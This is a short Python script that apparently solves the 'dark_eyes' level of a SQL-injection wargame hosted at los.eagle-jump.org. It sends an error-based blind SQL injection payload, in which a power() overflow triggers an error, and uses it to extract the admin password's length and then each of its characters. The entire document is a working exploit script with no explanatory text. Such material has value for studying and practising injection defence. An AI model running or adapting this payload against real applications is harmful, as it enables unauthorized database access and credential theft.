import requests as req
import sys
import string
s = req.session()
chrs = string.printable
cookies = {"PHPSESSID":""}
url = 'https://los.eagle-jump.org/dark_eyes.php'
#len
length = 0
pay = "' or id='admin' and power((%s)+1,9999999999)#"
for i in xrange(100):
	test = "length(pw) = %d"%i
	print test
	r = s.get(url,params={'pw':pay % test},cookies=cookies)
	if 'query' not in r.text:
		print '[+] found len = %d'%i
		length = i
		break
pw = ''
for i in xrange(1,length+1):
	for j in chrs:
		test = "ord(substr(pw,%d,1)) = %d" % (i,ord(j))
		print test
		r = s.get(url,params={'pw':pay % test},cookies=cookies)
		if 'query' not in r.text:
			pw += j
			print pw
			break
print '[+] found pw = '+pw
